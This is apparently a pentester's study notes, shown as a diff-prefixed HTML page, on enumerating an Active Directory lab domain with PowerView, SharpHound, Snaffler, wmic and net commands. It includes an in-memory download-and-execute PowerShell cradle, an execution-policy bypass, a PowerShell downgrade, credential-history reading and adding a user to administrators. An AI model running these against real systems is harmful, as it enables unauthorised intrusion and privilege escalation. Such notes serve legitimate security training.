+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">AD Powershell Module</span></em></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Discover modules</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-Module</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Load AD Module</p>
+<ul style="list-style-type: undefined;">
+    <li>Import-Module ActiveDirectory</li>
+    <li>Get-Module</li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get Domain Info</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-ADDomain</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-ADUser (serviceprinciplaname)</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-ADUser -Filter {ServicePrincipalName -ne &quot;$null&quot;} -Properties ServicePrincipalName</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Checking for trust relationships</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-ADTrust -Filter *</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Group Enumeration</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-ADGroup -Filter * | select name</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Detailed Group info</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-ADGroup -Identity &quot;Backup Operators&quot;</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Group Membership</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-ADGroupMember -Identity &quot;Backup Operators&quot;</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Powerview</span></em></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>helps us gain situational awareness within an AD environment</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Domain User info</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Recursive Group Membership</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Trust Enumeration</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-DomainTrustMapping</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Testing for local admin access</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Test-AdminAccess -ComputerName ACADEMY-EA-MS01</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Finding users with SPN set</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Sharpview</span></em></p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>.\SharpView.exe Get-DomainUser -Help</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Info on specific user</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>.\SharpView.exe Get-DomainUser -Identity forend</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Snaffler</span></em></p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>-s = print results to console, d = domain, -o write to log file, -v =verbosity, Data = prints results to screen</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Bloodhound</span></em></p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>.\SharpHound.exe &ndash;help</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Running sharphound collector</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>.\SharpHound.exe -c All --zipfilename ILFREIGHT</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;color:white;background:purple;">Living off the land</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Env commands for host and network recon</span></em></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Pc name: <strong>hostname</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Os version: <strong>[System.Environment]::OSVersion.Version</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Patches and hotfixes applied: <strong>wmic qfe get Caption,Description,HotFixID,InstalledOn</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Network adapter state and config: <strong>ipconfig /all</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Domain name to which host belongs: <strong>set %USERDOMAIN%</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Prints name of DC host checks in with (only from cmd): <strong>set %logonserver%</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>Systeminfo &ndash; covers all the above in one command</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>&nbsp;</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Harnessing powershell</span></em></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Lists available modules loaded for use: <strong>Get-Module</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Prints execution policy for each scope: <strong>Get-ExecutionPolicy -List</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>Set-ExecutionPolicy Bypass -Scope Process</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Powershell history: <strong>Get-Content C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Key paths, users, comp info: <strong>Get-ChildItem Env: | ft Key,Value</strong>&nbsp; &nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Download file from web, and call it from memory: <strong>powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString(&apos;URL to download the file from&apos;); &lt;follow-on commands&gt;&quot;</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Downgrading powershell: <strong>powershell.exe -version 2</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>&nbsp;</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Checking Defences</span></em></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Firewall checks:</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Netsh advfirewall show allprofiles</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>From cmd:</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Sc query windefend</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Comp status and configs</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-MpComputerStatus</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Am I alone check (ie anyone else logged on):</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Qwinsta</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Network Information</span></em></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>List all known hosts store in arp table: <strong>arp -a</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Print adapter settings for host &ndash; <strong>ipconfig /all</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Routing table, iding known networks &ndash; <strong>route print</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Status of firewall:<strong>&nbsp;netsh advfirewall show states</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>&nbsp;</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Windows Management Instrumentation (WMI)</span></em></p>
+<ul style="list-style-type: undefined;">
+    <li>Scripting engine widely used within windows enterprise environments</li>
+    <li>Useful commands: <a href="https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4">https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4</a></li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Prints patch level: <strong>wmic qfe get Caption,Description,HotFixID,InstalledOn</strong>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Display basic host info + attributes within list: <strong>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>A list of all processes on host: <strong>wmic process list /format:list</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Displays info about the domain and DC: <strong>wmic ntdomain list /format:list</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Displays info about all local accounts and any DC that have logged in device: <strong>wmic useraccount list /format:list</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Info about all local groups: <strong>wmic group list /format:list</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Dumps info about any sys accounts that are being used as service accounts: <strong>wmic sysaccount list /format:list</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>&nbsp;</strong></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Net Commands</span></em></p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Useful when enumerating info from the domain</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net accounts</strong> - Information about password requirements</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net accounts /domain</strong> - Password and lockout policy</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net group /domain</strong> - Information about domain groups</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net group &quot;Domain Admins&quot; /domain</strong>&nbsp; - List users with domain admin privileges</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net group &quot;domain computers&quot; /domain</strong> - List of PCs connected to the domain</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net group &quot;Domain Controllers&quot; /domain</strong> - List PC accounts of domains controllers</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net group &lt;domain_group_name&gt; /domain</strong> - User that belongs to the group</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net groups /domain</strong> - List of domain groups</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net localgroup</strong> - All available groups</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net localgroup administrators /domain</strong> - List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net localgroup Administrators</strong> - Information about a group (admins)</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net localgroup administrators [username] /add</strong> - Add user to administrators</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net share</strong>&nbsp; - Check current shares</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net user &lt;ACCOUNT_NAME&gt; /domain</strong> - Get information about a user within the domain</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net user /domain</strong> - List all users of the domain</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net user %username%</strong> - Information about the current user</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net use x: \computer\share</strong> - Mount the share locally</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net view</strong> - Get a list of computers</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net view /all /domain[:domainname]</strong> - Shares on the domains</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net view \computer /ALL</strong> - List shares of a computer</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>net view /domain</strong> - List of PCs of the domain</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Dsquery DLL</span></em></p>
